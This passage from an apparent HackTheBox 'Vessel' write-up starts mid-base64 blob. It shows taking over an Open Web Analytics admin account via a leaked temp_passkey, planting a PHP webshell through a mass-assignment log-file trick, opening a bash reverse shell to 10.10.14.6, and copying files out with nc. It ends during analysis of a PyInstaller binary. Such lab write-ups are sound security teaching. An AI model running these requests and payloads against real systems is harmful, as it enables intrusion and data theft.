ZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiI4MmYxMTUyYjRiM2RiNDI0MTM5YzIwMzBkMDQ3MjNiNCI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\n?>

```

The text starts with `<?php\n` just like expected, and then a PHP comment with a base64-encoded blob. I’ll base64 decode to get a serialized PHP object:

```

oxdf@hacky$ echo "Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJGFxOVJqemhPMXNUbzBmZm5QU21HSC5aaW5SQzNMbzlLajg3cnRsaWR0UFFFY2NIMFprd09lIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiI4MmYxMTUyYjRiM2RiNDI0MTM5YzIwMzBkMDQ3MjNiNCI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9" | base64 -d
O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$aq9RjzhO1sTo0ffnPSmGH.ZinRC3Lo9Kj87rtlidtPQEccH0ZkwOe";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"82f1152b4b3db424139c2030d04723b4";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}

```

In this item, I’ll find the admin user, with password hash and `temp_passkey`:

[![image-20230321104505447](https://0xdfimages.gitlab.io/img/image-20230321104505447.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230321104505447.png)

#### Admin Login

The blog post says:

> Though the **temp\_passkey** can directly be used to set a new password for the user via the **base.usersChangePassword** action.

The [source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/usersChangePassword.php) for this class includes the following `action` function:

```

    function action() {
		
		// needed for old style embedded install migration
		if ( $this->getParam('is_embedded') ) {
			
			owa_coreAPI::setSetting('base', 'is_embedded', true);
		}

        $auth = owa_auth::get_instance();
        $status = $auth->authenticateUserTempPasskey($this->params['k']);

        // log to event queue
        if ($status === true) {
            $ed = owa_coreAPI::getEventDispatch();
            $new_password = array('key' => $this->params['k'], 'password' => $this->params['password'], 'ip' => $_SERVER['REMOTE_ADDR'], 'user_id' => $auth->u->get('user_id'));
            $ed->log($new_password, 'base.set_password');
            $auth->deleteCredentials();
            $this->setRedirectAction('base.loginForm');
            $this->set('status_code', 3006);
        } else {
            $this->setRedirectAction('base.loginForm');
            $this->set('error_code', 2011); // can't find key in the db
        }
    }

```

It’s using `$this->params['k']` to authorized th user, and then using that result to get the username of what to change later. I’ll note that looking at other functions, I can see that something like `owa_password` in the request is fetched by `$this->params['password']` (the “owa\_” is implied somewhere).

Knowing this, it looks like I need `owa_password`, `owa_password2`, `owa_k`, and `owa_action` for this request.

I’ll grab the HTTP request to login and take a look:

```

POST /index.php?owa_do=base.loginForm&owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F& HTTP/1.1
Host: openwebanalytics.vessel.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://openwebanalytics.vessel.htb
Connection: close
Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm&owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&
Upgrade-Insecure-Requests: 1

owa_user_id=admin&owa_password=asd&owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&owa_action=base.login&owa_submit_btn=Login

```

I’ll send that to Repeater and play around with it a bit. I don’t need the `owa_go` and `owa_submit_btn` parameters. I can also remove the parameters in the URL, and it still returns the same failed login message. I’ll change `owa_action` to `base.usersChangePassword`. On sending, there’s a new error:

[![image-20230321105559407](https://0xdfimages.gitlab.io/img/image-20230321105559407.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230321105559407.png)

That matches what I expect from above. I’ll update the parameters to match the source, and this time it send a redirect to the login:

[![image-20230321110959249](https://0xdfimages.gitlab.io/img/image-20230321110959249.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230321110959249.png)

If I load that URL, the `owa_status_code` shows a message above the login:

![image-20230321111030275](https://0xdfimages.gitlab.io/img/image-20230321111030275.png)

And I’m able to log in:

![image-20230321111051376](https://0xdfimages.gitlab.io/img/image-20230321111051376.png)

### RCE

#### Background

In the [same blog post as above](https://devel0pment.de/?p=2494), the author shows how to get execution from admin access. It involves a [mass assignment vulnerability](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) in the configuration that allows me to set the logging level and log file to be a PHP file, and then get a webshell into that log and run it.

#### Generate Malicious Log File

Clicking on settings, there’s a bunch of options I can configure:

[![image-20230321113800439](https://0xdfimages.gitlab.io/img/image-20230321113800439.png)](https://0xdfimages.gitlab.io/img/image-20230321113800439.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230321113800439.png)

I’ll note the Event Log File Directory, as it gives the full path to the web directory:

![image-20230321114238277](https://0xdfimages.gitlab.io/img/image-20230321114238277.png)

Clicking the update button send this request:

```

POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: openwebanalytics.vessel.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 748
Origin: http://openwebanalytics.vessel.htb
Connection: close
Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral
Cookie: owa_userSession=admin; owa_passwordSession=0bed4ee9fdbd77fa4406bec47a6fe8eb0cf1d9e412594e9cb0f15fcfb308baa2
Upgrade-Insecure-Requests: 1

owa_config%5Bbase.resolve_hosts%5D=1&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=&owa_config%5Bbase.anonymize_ips%5D=0&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=7e9e9f4df7&owa_action=base.optionsUpdate&owa_module=base

```

Each item from the form is being submitted as a parameter here, and each in the format `owa_config[<item>]`. The two items mentioned in the post (`base.error_log_level` and `base.error_log_file`) are not options in the form or that are sent here. A mass assignment vuln is where I can add them and they get changed anyway! By setting the `error_log_level` to `2`, it will store all POST parameters in the log.

I’ll remove all of the `owa_config[]` things, and add back in these two:

```

POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: openwebanalytics.vessel.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 183
Origin: http://openwebanalytics.vessel.htb
Connection: close
Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral
Cookie: owa_userSession=admin; owa_passwordSession=0bed4ee9fdbd77fa4406bec47a6fe8eb0cf1d9e412594e9cb0f15fcfb308baa2
Upgrade-Insecure-Requests: 1

owa_config%5Bbase.error_log_level%5D=2&owa_config%5Bbase.error_log_file%5D=/var/www/html/owa/owa-data/logs/0xdf.php&&owa_nonce=7e9e9f4df7&owa_action=base.optionsUpdate&owa_module=base

```

After sending this, I can then read the log file:

![image-20230321114533442](https://0xdfimages.gitlab.io/img/image-20230321114533442.png)

#### Webshell

The goal is to get some PHP into this log file. I’ll send a change options POST again, but this time with a made up item:

```

POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: openwebanalytics.vessel.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: http://openwebanalytics.vessel.htb
Connection: close
Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral
Cookie: owa_userSession=admin; owa_passwordSession=0bed4ee9fdbd77fa4406bec47a6fe8eb0cf1d9e412594e9cb0f15fcfb308baa2
Upgrade-Insecure-Requests: 1

owa_config%5Bbase.0xdf%5D=<%3fphp+system($_REQUEST['cmd'])%3b+%3f>&&owa_nonce=7e9e9f4df7&owa_action=base.optionsUpdate&owa_module=base

```

This will write the data (which is a webshell) into the log file. On accessing it with `?cmd=id` added to the end of the URL, it executes:

![image-20230321115105872](https://0xdfimages.gitlab.io/img/image-20230321115105872.png)

#### Shell

To get a shell via this webshell, I’ll visit `http://openwebanalytics.vessel.htb/owa-data/logs/0xdf.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/443%200%3E%261%27`. This is a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), and connects back to a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.178 41224
bash: cannot set terminal process group (1003): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vessel:/var/www/html/owa/owa-data/logs$

```

I’ll do a [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q) with `script` and `stty`:

```

www-data@vessel:/var/www/html/owa/owa-data/logs$ script /dev/null -c bash
Script started, file is /dev/null
www-data@vessel:/var/www/html/owa/owa-data/logs$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@vessel:/var/www/html/owa/owa-data/logs$ 

```

## Shell as ethan

### Enumeration

#### Home Dirs

There are two users on this box with home directories:

```

www-data@vessel:/home$ ls -l
total 8
drwx------ 5 ethan  ethan  4096 Aug 11  2022 ethan
drwxrwxr-x 3 steven steven 4096 Aug 11  2022 steven

```

www-data can’t access ethan, but can see in steven’s:

```

www-data@vessel:/home/steven$ ls -la
total 33796
drwxrwxr-x 3 steven steven     4096 Aug 11  2022 .
drwxr-xr-x 4 root   root       4096 Aug 11  2022 ..
lrwxrwxrwx 1 root   root          9 Apr 18  2022 .bash_history -> /dev/null
-rw------- 1 steven steven      220 Apr 17  2022 .bash_logout
-rw------- 1 steven steven     3771 Apr 17  2022 .bashrc
drwxr-xr-x 2 ethan  steven     4096 Aug 11  2022 .notes
-rw------- 1 steven steven      807 Apr 17  2022 .profile
-rw-r--r-- 1 ethan  steven 34578147 May  4  2022 passwordGenerator

```

`passwordGenerator` is a Windows exe:

```

www-data@vessel:/home/steven$ file passwordGenerator 
passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows

```

`.notes` is a hidden directory with two files in it:

```

www-data@vessel:/home/steven$ ls -l .notes/
total 40
-rw-r--r-- 1 ethan  steven 17567 Aug 10  2022 notes.pdf
-rw-r--r-- 1 ethan  steven 11864 May  2  2022 screenshot.png

```

#### File Analysis

I’ll exfil all three files back to my machine with `nc -lnvp 444 > notes.pdf`, first starting a listener on my host, then sending the file into `nc` on Vessel:

```

www-data@vessel:/home/steven$ cat .notes/notes.pdf | nc 10.10.14.6 444

```

After a few seconds, hit Ctrl-c and then check the hashes to make sure it transferred completely without corruption:

```

www-data@vessel:/home/steven$ md5sum .notes/notes.pdf 
d66c5ed1614aec0896605f65667826fd  .notes/notes.pdf

```

```

oxdf@hacky$ md5sum notes.pdf 
d66c5ed1614aec0896605f65667826fd  notes.pdf

```

I’ll do the same for the other files.

`screenshot.png` is an image of the Secure Password Generator program:

![image-20230321121257212](https://0xdfimages.gitlab.io/img/image-20230321121257212.png)

The PDF is password protexted:

![image-20230321121548754](https://0xdfimages.gitlab.io/img/image-20230321121548754.png)

### passwordGenerator

#### Recover Python

Running `strings` on the file returns all sorts of hints that this is a Python executable:

```

oxdf@hacky$ strings -n 10 passwordGenerator
...[snip]...
Py_FileSystemDefaultEncoding
Failed to get address for Py_FileSystemDefaultEncoding
Py_FrozenFlag
Failed to get address for Py_FrozenFlag
...[snip]...
PyInstaller: FormatMessageW failed.
PyInstaller: pyi_win32_utils_to_utf8 failed.
...[snip]...
3python37.dll

```

To get Python-like source from a PyIntaller exe, I’ll use [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor):

```

oxdf@hacky$ python /opt/pyinstxtractor/pyinstxtractor.py passwordGenerator 
[+] Processing passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: passwordGenerator

You can now use a python decompiler on the pyc files within the extracted directory

```

